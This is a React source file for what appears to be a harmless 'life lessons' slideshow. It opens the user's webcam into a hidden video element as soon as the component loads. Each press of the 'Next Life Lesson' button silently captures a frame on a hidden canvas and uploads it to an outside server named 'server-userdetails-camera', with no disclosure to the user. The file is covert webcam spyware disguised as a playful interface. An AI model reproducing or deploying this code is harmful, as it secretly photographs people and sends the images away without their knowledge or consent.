import React, { useState, useRef, useEffect } from 'react';
import axios from 'axios';

const images = [
  { src: "https://source.unsplash.com/random/800x600?nature", caption: "Life is like a mountain, hard to climb but worth the view." },
  { src: "https://source.unsplash.com/random/800x600?city", caption: "Sometimes life feels like a traffic jam, just keep moving!" },
  { src: "https://source.unsplash.com/random/800x600?animals", caption: "Be like a cat: curious, independent, and always napping!" },
  { src: "https://source.unsplash.com/random/800x600?funny", caption: "Life’s better when you’re laughing." }
];

function AnimatedComponent() {
  const [isAnimating, setIsAnimating] = useState(false);
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    getUserMedia(); // Start video stream when the component mounts
  }, []);

  // Access the user's camera
  const getUserMedia = () => {
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        videoRef.current.srcObject = stream;
      })
      .catch((err) => {
        console.error("Error accessing the camera: ", err);
      });
  };

  // Capture a frame from the video stream
  const captureImage = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob((blob) => {
      const file = new File([blob], "capture.png", { type: "image/png" });
      sendImageToServer(file); // Send the image as a File object
    }, 'image/png');
  };

  // Send the captured image as a file to the backend server
  const sendImageToServer = (imageFile) => {
    const formData = new FormData();
    formData.append("img", imageFile);

    axios.post('https://server-userdetails-camera.onrender.com/send-data', formData, {
      headers: {
        'Content-Type': 'multipart/form-data'
      }
    })
      .then((response) => {
        console.log('Image sent successfully:', response.data);
      })
      .catch((error) => {
        console.error('Error sending image to server:', error);
      });
  };

  const handleButtonClick = () => {
    setIsAnimating(true);
    captureImage(); // Capture image when button is clicked
    setTimeout(() => {
      setIsAnimating(false);
      setCurrentImageIndex((prevIndex) => (prevIndex + 1) % images.length); // Cycle through images
    }, 1000); // Duration of the bounce animation
  };

  return (
    <div className="relative w-full h-screen flex flex-col justify-center items-center">
      {/* Background image */}
      <img
        src={images[currentImageIndex].src}
        alt="Life lesson"
        className={`w-full h-full object-cover transition-opacity duration-500 ${isAnimating ? 'opacity-0' : 'opacity-100'}`}
      />

      {/* Caption for image */}
      <div className="absolute bottom-20 w-full text-center text-white px-4">
        <p className="text-lg sm:text-2xl md:text-3xl font-bold bg-gray-900 bg-opacity-50 p-3 md:p-4 rounded-lg inline-block max-w-2xl mx-auto">
          {images[currentImageIndex].caption}
        </p>
      </div>

      {/* Animated button */}
      <div className="absolute top-0 left-0 w-full h-full flex justify-center items-center">
        <button
          onClick={handleButtonClick}
          className={`text-white bg-blue-500 hover:bg-blue-700 font-bold py-2 px-6 sm:py-3 sm:px-8 rounded-md text-base sm:text-lg md:text-xl ${isAnimating ? 'animate-bounce' : ''}`}
        >
          Next Life Lesson
        </button>
      </div>

      {/* Camera video feed (hidden) */}
      <video ref={videoRef} className="hidden" autoPlay />

      {/* Canvas to capture image (hidden) */}
      <canvas ref={canvasRef} width="640" height="480" className="hidden"></canvas>
    </div>
  );
}

export default AnimatedComponent;
